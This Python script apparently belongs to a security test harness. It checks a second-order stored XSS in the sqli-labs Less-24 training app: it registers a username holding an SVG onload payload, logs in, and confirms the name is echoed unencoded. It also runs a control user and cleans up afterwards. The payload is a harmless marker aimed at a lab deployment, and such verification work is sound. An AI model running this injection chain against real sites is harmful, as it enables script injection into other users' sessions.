# -*- coding: utf-8 -*-
"""OPT4-SO-01: Less-24 second-order stored XSS via session-username echo.

Chain: register payload username (escaped INSERT) -> login (verbatim back
into session) -> logged-in.php echoes it without output encoding.
Dedicated throwaway users only; deleted at the end.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from opt4lib import (  # noqa: E402
    BATCH_ID, BASE_SQLI, SOURCE_COMMIT_SQLI, Client, Run, db_query, redact_text,
)

PAYLOAD_USER = "<svg onload=__o4s=1>"
CONTROL_USER = "opt4ctl"
TEST_PASS = "Opt4SoOneTime2026"

MARKER = "<svg onload=__o4s=1>"


def main() -> int:
    run = Run("opt4-20261020-so01", {
        "case_id": "OPT4-SO-01",
        "batch_id": BATCH_ID,
        "deployment_id": "sqli-labs-wsl-02",
        "source_commit": SOURCE_COMMIT_SQLI,
        "base": BASE_SQLI,
    })
    obs: dict = {"steps": {}}

    baseline = int(db_query("SELECT COUNT(*) FROM security.users")[0][0])
    obs["baseline_users"] = baseline

    attacker = Client(BASE_SQLI)
    control = Client(BASE_SQLI)

    # 1. register payload user (first-stage write, escaped)
    reg = attacker.post("/Less-24/login_create.php", data={
        "username": PAYLOAD_USER, "password": TEST_PASS,
        "re_password": TEST_PASS, "submit": "Register",
    })
    obs["steps"]["payload_registered"] = "User Created" in reg.text or "user-created" in reg.text
    obs["steps"]["register_page_sha256"] = __import__("opt4lib").sha256_text(reg.text)

    # 2. DB readback: stored verbatim (literal < > survive the escape)
    stored = db_query(
        "SELECT id, username FROM security.users "
        f"WHERE username = '{PAYLOAD_USER.replace(chr(39), chr(39)*2)}'")
    obs["steps"]["stored_verbatim"] = {
        "rows": len(stored),
        "stored_username": stored[0][1] if stored else None,
        "matches_literal": bool(stored) and stored[0][1] == PAYLOAD_USER,
    }

    # 3. login: SELECT matches the literal, session gets it back
    login = attacker.post("/Less-24/login.php", data={
        "login_user": PAYLOAD_USER, "login_password": TEST_PASS,
        "mysubmit": "Login",
    })
    obs["steps"]["payload_login_status"] = login.status  # expect 302 to logged-in.php
    obs["steps"]["auth_cookie_set"] = any(c.name == "Auth" for c in attacker.jar)

    # 4. sink: logged-in.php raw echo
    logged = attacker.get("/Less-24/logged-in.php")
    obs["steps"]["sink_hit"] = {
        "status": logged.status,
        "marker_present_unencoded": MARKER in logged.text,
        "marker_encoded": MARKER.replace("<", "&lt;").replace(">", "&gt;") in logged.text,
    }

    # 5. control user: same flow without payload
    ctl_reg = control.post("/Less-24/login_create.php", data={
        "username": CONTROL_USER, "password": TEST_PASS,
        "re_password": TEST_PASS, "submit": "Register",
    })
    ctl_login = control.post("/Less-24/login.php", data={
        "login_user": CONTROL_USER, "login_password": TEST_PASS, "mysubmit": "Login",
    })
    ctl_logged = control.get("/Less-24/logged-in.php")
    obs["steps"]["control"] = {
        "registered": "user-created" in ctl_reg.text or ctl_login.status == 302,
        "login_status": ctl_login.status,
        "marker_absent": MARKER not in ctl_logged.text,
        "username_echoed": CONTROL_USER in ctl_logged.text,
    }

    # 6. cleanup
    db_query(f"DELETE FROM security.users WHERE username = "
             f"'{PAYLOAD_USER.replace(chr(39), chr(39)*2)}' OR username = '{CONTROL_USER}'")
    after = int(db_query("SELECT COUNT(*) FROM security.users")[0][0])
    leftovers = db_query("SELECT username FROM security.users WHERE username LIKE '%opt4%' OR username LIKE '%__opt4so%'")
    run.write_restore({
        "baseline_users": baseline,
        "after_cleanup_users": after,
        "restored": after == baseline and not leftovers,
    })
    obs["restore"] = {"users_after": after, "leftovers": leftovers}

    verdict = (
        obs["steps"]["payload_registered"]
        and obs["steps"]["stored_verbatim"]["matches_literal"]
        and obs["steps"]["payload_login_status"] == 302
        and obs["steps"]["sink_hit"]["marker_present_unencoded"]
        and obs["steps"]["control"]["marker_absent"]
        and after == baseline
    )
    obs["verdict"] = "触发" if verdict else "未触发"
    run.dump_clients({"attacker": attacker, "control": control})
    run.artifact("logged-in.payload.html", redact_text(logged.text))
    run.artifact("logged-in.control.html", redact_text(ctl_logged.text))
    record = run.finish(obs)
    print(f"verdict={obs['verdict']}")
    print(f"evidence={record['run_id']} artifacts={len(run.artifact_hashes())}")
    return 0 if verdict else 1


if __name__ == "__main__":
    raise SystemExit(main())
